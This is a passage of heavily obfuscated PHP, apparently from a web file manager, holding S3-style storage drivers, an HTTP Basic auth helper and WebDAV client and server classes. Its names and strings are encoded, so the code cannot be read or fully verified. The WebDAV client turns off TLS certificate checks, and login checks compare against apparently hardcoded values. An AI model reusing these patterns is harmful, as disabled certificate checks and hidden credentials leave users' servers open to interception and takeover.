= 0; goto BÎÓÄÄ¤Á›; BÎÓÄÄ¤Á›: $cš¤£Äç§â = 1024 * 200; $Fµ„ãÄøÄ = fopen($aŒ‚‡‚”é, $_SERVER[í…¶][1224]); while (!0) { $dº›ùó²— = $this->fileSubstr($C„¢–È¿¾, $f×ĞÜëÀìô, $cš¤£Äç§â); if ($dº›ùó²— === !1) { return !1; } fwrite($Fµ„ãÄøÄ, $dº›ùó²—); $f×ĞÜëÀìô += $cš¤£Äç§â; if (strlen($dº›ùó²—) < $cš¤£Äç§â) { break; } } goto eµ¨ˆ¾°òĞ; d¹¦İŸ„²Ñ: } public function link($fâ¼Æ²Ó¡‰, $bõ¦¥íÀÈ = '') { if (!$this->isFile($fâ¼Æ²Ó¡‰)) { return !1; } $f˜ï ÊÊ¾‹ = $this->getHost() . $_SERVER[í…¶][8] . $this->pathEncode($fâ¼Æ²Ó¡‰) . $bõ¦¥íÀÈ; return $this->auth->privateDownloadUrl($f˜ï ÊÊ¾‹, 3600 * 12); } public function fileOut($Dô§Êô²Í, $Dâ»¯™•¹œ = false, $CÀª–Ñ•ñô = false, $dº›—ìÄ¦ã = '') { $fí‹Í«•çµ =& $_SERVER[í…¶]; if (!$CÀª–Ñ•ñô) { $CÀª–Ñ•ñô = $this->pathThis($Dô§Êô²Í); } $fØéŠÈ³ƒ = $Dâ»¯™•¹œ ? $fí‹Í«•çµ[1225] . rawurlencode($CÀª–Ñ•ñô) : $fí‹Í«•çµ[33]; $Cí²À¨´è = $this->link($Dô§Êô²Í, $fØéŠÈ³ƒ); $this->fileOutLink($Cí²À¨´è); } public function fileOutServer($D„ÚîË¨¬À, $Aîßó«ÂØê = false, $EÛ†÷…µÚ  = false, $FÂ¯‚ÂÜáœ = '') { parent::fileOut($D„ÚîË¨¬À, $Aîßó«ÂØê, $EÛ†÷…µÚ , $FÂ¯‚ÂÜáœ); } public function fileOutImage($Bæî•Êíí’, $déÓÛÂ›ğì = 250) { $f‘ÓÕ¿Ò‰œ = $this->link($Bæî•Êíí’, $_SERVER[í…¶][1226] . $déÓÛÂ›ğì); $this->fileOutLink($f‘ÓÕ¿Ò‰œ); } public function fileOutImageServer($b¨—ì›¾¶, $aÆ¾—¢Êì = 250) { parent::fileOutImage($b¨—ì›¾¶, $aÆ¾—¢Êì); } public function hashMd5($AÉ‹‰’ŞãÑ) { $Døšğ®‰†Æ =& $_SERVER[í…¶]; $cØÜÓ˜ºÉ = $this->objectMeta($AÉ‹‰’ŞãÑ); return isset($cØÜÓ˜ºÉ[$Døšğ®‰†Æ[196]]) ? $cØÜÓ˜ºÉ[$Døšğ®‰†Æ[196]] : !1; $b«Ù£À•íô = $this->link($AÉ‹‰’ŞãÑ, $Døšğ®‰†Æ[1227]); } public function size($Fã—‡×¨†ò) { $céÜ§ß‹‘² = $this->objectMeta($Fã—‡×¨†ò); return $céÜ§ß‹‘² ? $céÜ§ß‹‘²[$_SERVER[í…¶][77]] : 0; } public function info($c“Ğ½…ÚÂ) { if ($this->isFolder($c“Ğ½…ÚÂ)) { return $this->folderInfo($c“Ğ½…ÚÂ); } else { if ($this->isFile($c“Ğ½…ÚÂ)) { return $this->fileInfo($c“Ğ½…ÚÂ); } } return !1; } public function exist($CÏ™ŒŸÚéÉ) { return $this->isFile($CÏ™ŒŸÚéÉ) || $this->isFolder($CÏ™ŒŸÚéÉ); } public function isFile($Bƒ¥ëåç•Î) { return !$this->isFolder($Bƒ¥ëåç•Î) && $this->objectMeta($Bƒ¥ëåç•Î); } public function isFolder($aãæõÌßˆ¯) { return $this->cacheMethod($_SERVER[í…¶][223], $aãæõÌßˆ¯); } protected function objectMeta($dØÇ­­‘·¡) { return $this->cacheMethod($_SERVER[í…¶][224], $dØÇ­­‘·¡); } protected function _objectMeta($eĞŞÔ±â÷ì) { $dÃç™âôˆ‘ =& $_SERVER[í…¶]; list($B·­ù´âÁÈ, $aĞÂ…‹¡Ù) = $this->bucketManager->stat($this->bucket, $eĞŞÔ±â÷ì); if ($B·­ù´âÁÈ) { $B·­ù´âÁÈ[$dÃç™âôˆ‘[77]] = intval($B·­ù´âÁÈ[$dÃç™âôˆ‘[1214]]); } return $B·­ù´âÁÈ; } protected function _isFolder($D…¤‡ŠŞë) { $bÌ‘åêÃß =& $_SERVER[í…¶]; if ($D…¤‡ŠŞë == $bÌ‘åêÃß[33] || $D…¤‡ŠŞë == $bÌ‘åêÃß[8]) { return !0; } list($fíÛÏ®²ê’, $AÃ…Ê¶Ğø) = $this->bucketManager->listFiles($this->bucket, trim($D…¤‡ŠŞë, $bÌ‘åêÃß[8]) . $bÌ‘åêÃß[8], $bÌ‘åêÃß[33], 1, $bÌ‘åêÃß[8]); return !empty($fíÛÏ®²ê’[$bÌ‘åêÃß[1213]]) || !empty($fíÛÏ®²ê’[$bÌ‘åêÃß[1216]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($AÉ‹½¯ôè) { parent::__construct($AÉ‹½¯ôè); } public function uploadFormData($BµÑ¨¾¯–, $b¬±¬Ÿ¨„Æ = 3600) { goto B’Ó‰×êˆ; FÁì®¸ÙŠÒ: $f“×÷¾è¥ = array($this->accessKey, $Få ƒ’¬¥ø, $this->region, $e÷ÉÓï£Ëª, $FÌ¢¹Ÿİ®Ö); $Cîë²Œêª = implode($C÷ºæÂöà¢[8], $f“×÷¾è¥); $bˆùÍ»Ø‘ = array($C÷ºæÂöà¢[1100] => gmdate($C÷ºæÂöà¢[1099], strtotime($C÷ºæÂöà¢[1135])), $C÷ºæÂöà¢[1101] => array(array($C÷ºæÂöà¢[1103] => $this->bucket), array($C÷ºæÂöà¢[1102] => $bŠÑøÉĞ‘), array($C÷ºæÂöà¢[1104], $C÷ºæÂöà¢[1105], $C÷ºæÂöà¢[33]), array($C÷ºæÂöà¢[1104], $C÷ºæÂöà¢[1136], $C÷ºæÂöà¢[33]), array($C÷ºæÂöà¢[1104], $C÷ºæÂöà¢[1137], $C÷ºæÂöà¢[33]), array($C÷ºæÂöà¢[1106] => $BÖÊö×™ª), array($C÷ºæÂöà¢[1138] => $Cîë²Œêª), array($C÷ºæÂöà¢[1139] => $EÍ„±ƒÅâˆ), array($C÷ºæÂöà¢[1140] => $Aã¤ºŸ¸Ú), array($C÷ºæÂöà¢[1141] => $dì›â²µ§))); goto cœáæ¥Ü·Ê; CÕùÉôÌÔ: $dÙèèâ„‹ = array($C÷ºæÂöà¢[199] => $C÷ºæÂöà¢[33], $C÷ºæÂöà¢[1144] => $C÷ºæÂöà¢[33], $C÷ºæÂöà¢[1102] => $bŠÑøÉĞ‘, $C÷ºæÂöà¢[1106] => $BÖÊö×™ª, $C÷ºæÂöà¢[1110] => $e¢‰ç×Š˜, $C÷ºæÂöà¢[1145] => $Cîë²Œêª, $C÷ºæÂöà¢[1146] => $EÍ„±ƒÅâˆ, $C÷ºæÂöà¢[1147] => $Aã¤ºŸ¸Ú, $C÷ºæÂöà¢[1148] => $dì›â²µ§, $C÷ºæÂöà¢[1149] => $fš„ŒÖ‘™æ, $C÷ºæÂöà¢[169] => $this->getHost()); return $dÙèèâ„‹; goto Cµ²¿èéŠ½; Có†”ÂÕëÃ: $d ‰„ò„¥‚ = hash_hmac($C÷ºæÂöà¢[1142], $e÷ÉÓï£Ëª, $a³•ª×öµÜ, !0); $Cõ’•÷ŒÂ‡ = hash_hmac($C÷ºæÂöà¢[1142], $FÌ¢¹Ÿİ®Ö, $d ‰„ò„¥‚, !0); $fš„ŒÖ‘™æ = hash_hmac($C÷ºæÂöà¢[1142], $e¢‰ç×Š˜, $Cõ’•÷ŒÂ‡); goto CÕùÉôÌÔ; CÍ ŒÙå—: $e÷ÉÓï£Ëª = $C÷ºæÂöà¢[59]; $Aã¤ºŸ¸Ú = gmdate($C÷ºæÂöà¢[1133]); $Få ƒ’¬¥ø = gmdate($C÷ºæÂöà¢[692]); goto dßİŠà‰”‹; dßİŠà‰”‹: $FÌ¢¹Ÿİ®Ö = $C÷ºæÂöà¢[1134]; $dì›â²µ§ = $b¬±¬Ÿ¨„Æ . $C÷ºæÂöà¢[33]; $BÖÊö×™ª = $C÷ºæÂöà¢[1098]; goto FÁì®¸ÙŠÒ; cœáæ¥Ü·Ê: $e¢‰ç×Š˜ = base64_encode(json_encode($bˆùÍ»Ø‘)); $Dê›Š–ŞÜ‰ = hash_hmac($C÷ºæÂöà¢[1142], $Få ƒ’¬¥ø, $C÷ºæÂöà¢[1143] . $this->secret, !0); $a³•ª×öµÜ = hash_hmac($C÷ºæÂöà¢[1142], $this->region, $Dê›Š–ŞÜ‰, !0); goto Có†”ÂÕëÃ; B’Ó‰×êˆ: $C÷ºæÂöà¢ =& $_SERVER[í…¶]; $bŠÑøÉĞ‘ = $C÷ºæÂöà¢[185]; $EÍ„±ƒÅâˆ = $C÷ºæÂöà¢[1132]; goto CÍ ŒÙå—; Cµ²¿èéŠ½: } public function multiUploadFormData($a¡ÅõÉŒ•, $EÒë´×Ø¸ = 3600) { $A—µÃ×öíÕ =& $_SERVER[í…¶]; $f™‡Ä—§Œ¨ = gmdate($A—µÃ×öíÕ[1228]); $d™Í —‘èç = array(); $fùÄùöš‡í = $this->client->getUploadId($this->bucket, $a¡ÅõÉŒ•, $d™Í —‘èç); if (!$fùÄùöš‡í) { return !1; } return array($A—µÃ×öíÕ[209] => $fùÄùöš‡í, $A—µÃ×öíÕ[169] => $this->getHost() . $A—µÃ×öíÕ[8] . $this->pathEncode($a¡ÅõÉŒ•), $A—µÃ×öíÕ[210] => $f™‡Ä—§Œ¨, $A—µÃ×öíÕ[89] => $a¡ÅõÉŒ•); } public function multiUploadAuthData($D„ØÍ¼¶·, $A‘¢‡‘¡´¡ = array()) { goto B˜Œ˜é»Şê; CøÁ‚â÷Ñà: $Cø·ŸÜ¡å = $A‘ñ²ÛÔ™[214]; $CİßÂøŒ–• = $A‘ñ²ÛÔ™[8] . $this->pathEncode($F¯ÏÄäŠ¹) . $e¹áÄìéÎ; $f’“²‘¡ŠÖ = $this->client->__getSignatureV4($CÎâƒ›ä¬Ó, $eŸ‘çªƒ„, $Cø·ŸÜ¡å, $CİßÂøŒ–•); goto B…Ã‰„Â‘Õ; eñ ­›ò†…: if (isset($A‘¢‡‘¡´¡[$A‘ñ²ÛÔ™[1229]])) { $CÎâƒ›ä¬Ó[$A‘ñ²ÛÔ™[1230]] = $A‘¢‡‘¡´¡[$A‘ñ²ÛÔ™[1229]]; } $A’˜½áˆèó = explode($A‘ñ²ÛÔ™[171], $this->getHost()); $eŸ‘çªƒ„ = array($A‘ñ²ÛÔ™[1231] => $A’˜½áˆèó[1], $A‘ñ²ÛÔ™[1232] => $A‘ñ²ÛÔ™[33], $A‘ñ²ÛÔ™[199] => $A‘ñ²ÛÔ™[116], $A‘ñ²ÛÔ™[1144] => $A‘¢‡‘¡´¡[$A‘ñ²ÛÔ™[77]]); goto CøÁ‚â÷Ñà; DŞº’óĞ½: unset($A‘¢‡‘¡´¡[$A‘ñ²ÛÔ™[89]]); if (isset($A‘¢‡‘¡´¡[$A‘ñ²ÛÔ™[211]])) { return $this->listUploadParts($F¯ÏÄäŠ¹, $A‘¢‡‘¡´¡); } $CÎâƒ›ä¬Ó = array(); goto eñ ­›ò†…; B…Ã‰„Â‘Õ: if (strpos($e¹áÄìéÎ, $A‘ñ²ÛÔ™[213]) === 0) { if (isset($CÎâƒ›ä¬Ó[$A‘ñ²ÛÔ™[1230]])) { $a­ˆœËœéˆ = $CÎâƒ›ä¬Ó[$A‘ñ²ÛÔ™[1230]]; } else { if (isset($f’“²‘¡ŠÖ[$A‘ñ²ÛÔ™[1230]])) { $a­ˆœËœéˆ = $f’“²‘¡ŠÖ[$A‘ñ²ÛÔ™[1230]]; } else { $a­ˆœËœéˆ = hash($A‘ñ²ÛÔ™[1142], $A‘ñ²ÛÔ™[33]); } } return array($A‘ñ²ÛÔ™[220] => $f’“²‘¡ŠÖ[$A‘ñ²ÛÔ™[220]], $A‘ñ²ÛÔ™[1230] => $a­ˆœËœéˆ, $A‘ñ²ÛÔ™[210] => $f’“²‘¡ŠÖ[$A‘ñ²ÛÔ™[1233]]); } return $f’“²‘¡ŠÖ[$A‘ñ²ÛÔ™[220]]; goto D’çÊëñË¶; B˜Œ˜é»Şê: $A‘ñ²ÛÔ™ =& $_SERVER[í…¶]; $e¹áÄìéÎ = isset($A‘¢‡‘¡´¡[$A‘ñ²ÛÔ™[160]]) ? $A‘¢‡‘¡´¡[$A‘ñ²ÛÔ™[160]] : $A‘ñ²ÛÔ™[33]; $F¯ÏÄäŠ¹ = $A‘¢‡‘¡´¡[$A‘ñ²ÛÔ™[89]]; goto DŞº’óĞ½; D’çÊëñË¶: } public function listUploadParts($B×ÌÕÕš¦, $Fºóòš¤ù = array()) { goto bÙ³¹£Ù×; BŒ…Î‘Ÿêƒ: $E³™ÎÁÙäÄ .= $EÆÓÑÌ´ğ[1237]; $eßæÏ”ÅÅã = array(); $DÏ‰Œ‹›Öê = explode($EÆÓÑÌ´ğ[171], $this->getHost()); goto C¢ˆĞ·Ã‘Š; C¢ˆĞ·Ã‘Š: $DÕ—‰‹²­ = array($EÆÓÑÌ´ğ[1231] => $DÏ‰Œ‹›Öê[1], $EÆÓÑÌ´ğ[199] => $EÆÓÑÌ´ğ[116], $EÆÓÑÌ´ğ[1144] => strlen($E³™ÎÁÙäÄ)); $fé¦×ÁÌÀ = $EÆÓÑÌ´ğ[212]; $b§œÁ²Œñ = $EÆÓÑÌ´ğ[8] . $this->pathEncode($B×ÌÕÕš¦) . $Fºóòš¤ù[$EÆÓÑÌ´ğ[160]]; goto F÷¶Úö²Ãš; bÙ³¹£Ù×: $EÆÓÑÌ´ğ =& $_SERVER[í…¶]; $aİÒ¾¦ñŞ = str_replace($EÆÓÑÌ´ğ[221], $EÆÓÑÌ´ğ[33], $Fºóòš¤ù[$EÆÓÑÌ´ğ[160]]); $AˆˆŠ ¼Ã¾ = $this->client->listParts($this->bucket, $B×ÌÕÕš¦, $aİÒ¾¦ñŞ); goto A¯Ç†µä‘; A¯Ç†µä‘: if (!$AˆˆŠ ¼Ã¾) { return !1; } $E³™ÎÁÙäÄ = $EÆÓÑÌ´ğ[1234]; foreach ($AˆˆŠ ¼Ã¾ as $a…¤Ù‰é‚Ù) { $E³™ÎÁÙäÄ .= $EÆÓÑÌ´ğ[1235] . "\x3c\120\141\x72\x74\116\165\155\142\145\162\76{$a…¤Ù‰é‚Ù[$EÆÓÑÌ´ğ[1186]]}\x3c\x2f\120\141\x72\x74\x4e\165\155\142\x65\162\x3e\xa" . "\x3c\105\124\x61\x67\76{$a…¤Ù‰é‚Ù[$EÆÓÑÌ´ğ[1187]]}\74\x2f\x45\124\x61\147\x3e\xa" . $EÆÓÑÌ´ğ[1236]; } goto BŒ…Î‘Ÿêƒ; F÷¶Úö²Ãš: $b¿‚²Ìíí¡ = $this->client->__getSignatureV4($eßæÏ”ÅÅã, $DÕ—‰‹²­, $fé¦×ÁÌÀ, $b§œÁ²Œñ, $E³™ÎÁÙäÄ); return array($EÆÓÑÌ´ğ[220] => $b¿‚²Ìíí¡[$EÆÓÑÌ´ğ[220]], $EÆÓÑÌ´ğ[210] => $b¿‚²Ìíí¡[$EÆÓÑÌ´ğ[1233]], $EÆÓÑÌ´ğ[222] => $AˆˆŠ ¼Ã¾, $EÆÓÑÌ´ğ[1230] => $b¿‚²Ìíí¡[$EÆÓÑÌ´ğ[1230]]); goto bÄç¿ˆìÅ; bÄç¿ˆìÅ: } public function link($EïàîÔ³…§, $fâÖ‘İ¾Ë¢ = array()) { return parent::link($EïàîÔ³…§, $fâÖ‘İ¾Ë¢); } public function fileOut($d™‹‚Ä­íæ, $C¬Ÿ£ÕÅñ” = false, $aÊ½—×ƒôŒ = false, $fôØô¢ó = '') { if (strstr($this->endpoint, $_SERVER[í…¶][1238])) { return parent::fileOutServer($d™‹‚Ä­íæ, $C¬Ÿ£ÕÅñ”, $aÊ½—×ƒôŒ, $fôØô¢ó); } parent::fileOut($d™‹‚Ä­íæ, $C¬Ÿ£ÕÅñ”, $aÊ½—×ƒôŒ, $fôØô¢ó); } public function fileOutImage($BŠº›—’¯, $DâŞ»ºŠš = 250) { if (strstr($this->endpoint, $_SERVER[í…¶][1238])) { return parent::fileOutImageServer($BŠº›—’¯, $DâŞ»ºŠš); } parent::fileOutImage($BŠº›—’¯, $DâŞ»ºŠš); } public function fileOutLink($Fè§­ÃÏ¬¿) { $F­ƒôÔÃˆš =& $_SERVER[í…¶]; if (substr($Fè§­ÃÏ¬¿, 0, 7) == $F­ƒôÔÃˆš[1113]) { $Fè§­ÃÏ¬¿ = $F­ƒôÔÃˆš[1114] . substr($Fè§­ÃÏ¬¿, 7); } header($F­ƒôÔÃˆš[156] . $Fè§­ÃÏ¬¿); die; } public function getHost() { $bí¥‹¸ƒòä =& $_SERVER[í…¶]; $D·Ä­Ñ°¥š = str_rtrim(parent::getHost(), $bí¥‹¸ƒòä[8] . $this->bucket); $D·Ä­Ñ°¥š = explode($bí¥‹¸ƒòä[171], $D·Ä­Ñ°¥š); return $D·Ä­Ñ°¥š[0] . $bí¥‹¸ƒòä[171] . $this->bucket . $bí¥‹¸ƒòä[91] . $D·Ä­Ñ°¥š[1]; } } goto CÏÖô„ƒ›µ; BãïÃë“Ù: class HttpAuth { public static function get() { $D‘»¸ÏÛô =& $_SERVER[í…¶]; $aÄÇ½Á¿ÜĞ = $D‘»¸ÏÛô[33]; $fÄ’Á²Ğä = $D‘»¸ÏÛô[33]; if (isset($_SERVER[$D‘»¸ÏÛô[1756]])) { $aÄÇ½Á¿ÜĞ = $_SERVER[$D‘»¸ÏÛô[1756]]; $fÄ’Á²Ğä = $_SERVER[$D‘»¸ÏÛô[1757]]; } elseif (isset($_SERVER[$D‘»¸ÏÛô[1758]])) { $DÎİ™š­×Ò = $_SERVER[$D‘»¸ÏÛô[1758]]; if (strpos(strtolower($DÎİ™š­×Ò), $D‘»¸ÏÛô[1759]) === 0) { $FÈ¶ˆïÆ» = explode($D‘»¸ÏÛô[4], base64_decode(substr($DÎİ™š­×Ò, 6))); $aÄÇ½Á¿ÜĞ = isset($FÈ¶ˆïÆ»[0]) ? $FÈ¶ˆïÆ»[0] : $D‘»¸ÏÛô[33]; $fÄ’Á²Ğä = isset($FÈ¶ˆïÆ»[1]) ? $FÈ¶ˆïÆ»[1] : 0; } } return array($D‘»¸ÏÛô[544] => $aÄÇ½Á¿ÜĞ, $D‘»¸ÏÛô[895] => $fÄ’Á²Ğä); } public static function error() { goto AŠ½ˆºøğÍ; AŠ½ˆºøğÍ: $b¿àƒ˜‚ƒÜ =& $_SERVER[í…¶]; header($b¿àƒ˜‚ƒÜ[1760]); header($b¿àƒ˜‚ƒÜ[1761]); goto C†ê¿«Ö; a¢¯åƒÎÕª: die; goto eùâ‹šÔ§™; C†ê¿«Ö: header($b¿àƒ˜‚ƒÜ[1762]); header($b¿àƒ˜‚ƒÜ[1763]); header($b¿àƒ˜‚ƒÜ[1261]); goto a¢¯åƒÎÕª; eùâ‹šÔ§™: } public static function make($aÂğµñÎ†œ, $AêÂ¤ßÈã›) { $DäÓĞæœÄ½ =& $_SERVER[í…¶]; return $DäÓĞæœÄ½[1764] + base64_encode($aÂğµñÎ†œ . $DäÓĞæœÄ½[4] . $AêÂ¤ßÈã›); } } class HttpDavClient { public function __construct($AàÛ“î…‹, $Dí¹¢öä˜, $b­Ö™•âÉ) { $this->header = array(); $this->userName = $Dí¹¢öä˜; $this->userPassowrd = $b­Ö™•âÉ; } protected function makePath($FÌ–Ì‘ÏÉ) { return $FÌ–Ì‘ÏÉ; } protected function setHeader($báˆ¨¼’Ø, $bŒªæˆµ = false) { if ($bŒªæˆµ === !1) { $this->header[] = $báˆ¨¼’Ø; } else { $this->header[] = $báˆ¨¼’Ø . $_SERVER[í…¶][878] . $bŒªæˆµ; } } public function move($dËÀæ²Ø Í, $Eç±öÈò¼ƒ, $Dõ³á­‹÷ß = '') { $bª«Åçùó£ =& $_SERVER[í…¶]; $this->setHeader($bª«Åçùó£[1765], $this->makePath($Eç±öÈò¼ƒ)); $this->setHeader($bª«Åçùó£[1766], $bª«Åçùó£[1767]); if ($Dõ³á­‹÷ß) { $this->setHeader($bª«Åçùó£[1768], $bª«Åçùó£[923] . $Dõ³á­‹÷ß . $bª«Åçùó£[926]); } return $this->send($bª«Åçùó£[1769], $dËÀæ²Ø Í); } public function copy($b„Ú¥‘ç”, $F›¡×–šÛ‘) { $BØ´Ìƒô” =& $_SERVER[í…¶]; $this->setHeader($BØ´Ìƒô”[1765], $this->makePath($F›¡×–šÛ‘)); $this->setHeader($BØ´Ìƒô”[1766], $BØ´Ìƒô”[1767]); return $this->send($BØ´Ìƒô”[1770], $b„Ú¥‘ç”); } public function mkcol($aì¢†éâÎ¢) { $C‡ˆÚµ®í· =& $_SERVER[í…¶]; $this->setHeader($C‡ˆÚµ®í·[1766], $C‡ˆÚµ®í·[1767]); return $this->send($C‡ˆÚµ®í·[1771], $aì¢†éâÎ¢); } public function delete($b‡Ïê¡‰ó†, $CÉóƒ™ÜÁ = '') { $E•·³êÑª =& $_SERVER[í…¶]; if ($CÉóƒ™ÜÁ) { $this->setHeader($E•·³êÑª[1768], $E•·³êÑª[923] . $CÉóƒ™ÜÁ . $E•·³êÑª[926]); } return $this->send($E•·³êÑª[1249], $b‡Ïê¡‰ó†); } public function propfind($Bâ—×ì®š) { $E…ŠİœÙÔ¸ =& $_SERVER[í…¶]; $this->setHeader($E…ŠİœÙÔ¸[1772], $E…ŠİœÙÔ¸[83]); $this->setHeader($E…ŠİœÙÔ¸[1773], $E…ŠİœÙÔ¸[1774]); $E…×öê„¾Ê = $E…ŠİœÙÔ¸[1775]; return $this->send($E…ŠİœÙÔ¸[1776], $Bâ—×ì®š, $E…×öê„¾Ê); } public function options($dïÜÖ›Å) { return $this->send($_SERVER[í…¶][1777], $dïÜÖ›Å); } public function get($Bêá‰•ÖÃ) { return $this->send($_SERVER[í…¶][216], $Bêá‰•ÖÃ); } public function put($Fø²Š¿ÓÄç, $c÷¬¡çÍ¡í, $añˆÚá¡– = '') { $Câ¨„‰Á¢ =& $_SERVER[í…¶]; if ($añˆÚá¡–) { $this->setHeader($Câ¨„‰Á¢[1768], $Câ¨„‰Á¢[923] . $añˆÚá¡– . $Câ¨„‰Á¢[926]); } return $this->send($Câ¨„‰Á¢[214], $Fø²Š¿ÓÄç, $c÷¬¡çÍ¡í); } protected function send($CÜÈ÷á ë, $BÜˆÍ ¥Ş, $AÂ£¾êÅÕ = false, $eµÈŒò¹¢¿ = false) { goto cÎÎ¦´¯»; cóåÍöãô¡: curl_setopt($f¹Â…¦Ì±è, CURLOPT_HTTPHEADER, $this->header); curl_setopt($f¹Â…¦Ì±è, CURLOPT_RETURNTRANSFER, !0); curl_setopt($f¹Â…¦Ì±è, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto AŸäË°ß²; Bµ–”íÙª×: $this->header = array(); return $dï•Ó¯„òô; goto BºõÈİ˜İ; bÕ±óŠ‡õ: $f¹Â…¦Ì±è = curl_init($BÜˆÍ ¥Ş); curl_setopt($f¹Â…¦Ì±è, CURLOPT_CUSTOMREQUEST, $CÜÈ÷á ë); curl_setopt($f¹Â…¦Ì±è, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto cóåÍöãô¡; F«†Æ©¾: $this->setHeader($b¿«Ÿñ²íí); if ($AÂ£¾êÅÕ) { $AÂ£¾êÅÕ = $d…°°ÑÒ™°[1779] . $AÂ£¾êÅÕ; } if (!request_url_safe($BÜˆÍ ¥Ş)) { return !1; } goto bÕ±óŠ‡õ; AŸäË°ß²: curl_setopt($f¹Â…¦Ì±è, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($f¹Â…¦Ì±è, CURLOPT_SSL_VERIFYHOST, !1); $dï•Ó¯„òô = curl_exec($f¹Â…¦Ì±è); goto Bµ–”íÙª×; cÎÎ¦´¯»: $d…°°ÑÒ™° =& $_SERVER[í…¶]; $b¿«Ÿñ²íí = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($d…°°ÑÒ™°[1778], $d…°°ÑÒ™°[50]); goto F«†Æ©¾; BºõÈİ˜İ: } } class HttpDavServer { public function __construct($dŸÜÎŞºÑÁ, $E¨öÈˆ‹†) { $this->root = $dŸÜÎŞºÑÁ; $this->initPath($E¨öÈˆ‹†); $this->start(); } public function initPath($b³—ªÀƒ³À) { $Aé„¡–ù’é =& $_SERVER[í…¶]; $eÌÍïœ‡˜ñ = rtrim($_SERVER[$Aé„¡–ù’é[1384]], $Aé„¡–ù’é[8]) . $Aé„¡–ù’é[8]; $this->urlBase = substr($eÌÍïœ‡˜ñ, 0, strpos($eÌÍïœ‡˜ñ, $b³—ªÀƒ³À) + 1); $this->urlBase = rtrim($this->urlBase, $Aé„¡–ù’é[8]) . $b³—ªÀƒ³À; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $EïìÈ×‰‡ =& $_SERVER[í…¶]; $Eè˜Òƒˆò = HttpAuth::get(); if ($Eè˜Òƒˆò[$EïìÈ×‰‡[544]] == $EïìÈ×‰‡[1780] && $Eè˜Òƒˆò[$EïìÈ×‰‡[895]] == $EïìÈ×‰‡[1781]) { return !0; } HttpAuth::error(); } public function start() { goto fŸºßŸ°ÀŒ; fŸºßŸ°ÀŒ: $b˜À±…Š—ˆ =& $_SERVER[í…¶]; $this->checkUser(); $eŠØˆ‹ã = $b˜À±…Š—ˆ[144] . HttpHeader::method(); goto fùñÉôÖó; fùñÉôÖó: if (!method_exists($this, $eŠØˆ‹ã)) { pr($eŠØˆ‹ã . $b˜À±…Š—ˆ[1782]); die; } $b‚ßËØƒÆë = array($b˜À±…Š—ˆ[1783], $b˜À±…Š—ˆ[1784]); if (!in_array($eŠØˆ‹ã, $b‚ßËØƒÆë) && !$this->pathExists($this->path)) { $F¶ËÊÕ©à = array($b˜À±…Š—ˆ[1030] => 404); } else { $F¶ËÊÕ©à = $this->{$eŠØˆ‹ã}(); } goto fœ°ø§ÙÒÎ; fœ°ø§ÙÒÎ: if (!$F¶ËÊÕ©à) { return; } self::response($F¶ËÊÕ©à); goto d“ÎùÌÑ­Ø; d“ÎùÌÑ­Ø: } public function pathGet($a®íÒ¢¨‰Û = false) { $bÉ²¬ë«²à =& $_SERVER[í…¶]; $B¤¸¬Ä±ËÒ = $a®íÒ¢¨‰Û ? $_SERVER[$bÉ²¬ë«²à[1785]] : $_SERVER[$bÉ²¬ë«²à[1384]]; $B¤¸¬Ä±ËÒ = KodIO::clear(rawurldecode($B¤¸¬Ä±ËÒ)); if (!strstr($B¤¸¬Ä±ËÒ, KodIO::clear($this->urlBase))) { return !1; } return substr($B¤¸¬Ä±ËÒ, strpos($B¤¸¬Ä±ËÒ, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($D­Ÿ¿Úì‰) { return file_exists($D­Ÿ¿Úì‰); } public function pathMkdir($CéÂï¼œ”–) { return mkdir($CéÂï¼œ”–, 511, !0); } public function pathInfo($C¯„Ï³…Á—) { return path_info($C¯„Ï³…Á—); } public function pathList($AÅ†¨³ÔÚŸ) { return path_list($AÅ†¨³ÔÚŸ); } public function pathOut($b›Ä›å™¿§) { echo file_get_contents($b›Ä›å™¿§); } public function pathPut($dÜ°Ö½áØ, $fõšÅ…—Ï¦ = '') { if (!$fõšÅ…—Ï¦) { return file_put_contents($dÜ°Ö½áØ, $_SERVER[í…¶][33]); } return move_path($fõšÅ…—Ï¦, $dÜ°Ö½áØ); } public function pathRemove($B—å¦í˜êÂ) { if (is_file($B—å¦í˜êÂ)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($Aã ÓİµÍé, $F¢Šâ¦²Üİ) { return move_path($Aã ÓİµÍé, $F¢Šâ¦²Üİ); } public function pathCopy($E½Ïà‡ï®ù, $F¯‰Ğëº–) { return copy_dir($E½Ïà‡ï®ù, $F¯‰Ğëº–); } public function parsePath($fÄøÆåã¨) { return $fÄøÆåã¨; } public function parseItem($e°•¡¯Ìó, $Aã‰«á†”) { goto E¢îÉ¿÷Œ; bÌ¹ƒÜ”ğÓ: $f˜§ôÕñ = array($c½ƒ¸Í‡ñã[1786] => KodIO::clear($this->urlBase . $Aµ´øë´Ë·), $c½ƒ¸Í‡ñã[107] => @gmdate($c½ƒ¸Í‡ñã[1787], $e°•¡¯Ìó[$c½ƒ¸Í‡ñã[107]]), $c½ƒ¸Í‡ñã[187] => @gmdate($c½ƒ¸Í‡ñã[1788], $e°•¡¯Ìó[$c½ƒ¸Í‡ñã[187]]), $c½ƒ¸Í‡ñã[77] => $e°•¡¯Ìó[$c½ƒ¸Í‡ñã[77]] ? $e°•¡¯Ìó[$c½ƒ¸Í‡ñã[77]] : 0); return $f˜§ôÕñ; goto b—¬âåĞµ; B“º£İê«: if ($Aã‰«á†”) { $Aµ´øë´Ë· = $c½ƒ¸Í‡ñã[8] . str_replace($c½ƒ¸Í‡ñã[172], $c½ƒ¸Í‡ñã[8], rawurlencode($this->pathGet())); } if (!trim($e°•¡¯Ìó[$c½ƒ¸Í‡ñã[107]])) { $e°•¡¯Ìó[$c½ƒ¸Í‡ñã[107]] = time(); } if (!trim($e°•¡¯Ìó[$c½ƒ¸Í‡ñã[187]])) { $e°•¡¯Ìó[$c½ƒ¸Í‡ñã[187]] = time(); } goto bÌ¹ƒÜ”ğÓ; E¢îÉ¿÷Œ: $c½ƒ¸Í‡ñã =& $_SERVER[í…¶]; $Aµ´øë´Ë· = $this->pathGet() . $c½ƒ¸Í‡ñã[8] . $e°•¡¯Ìó[$c½ƒ¸Í‡ñã[28]]; 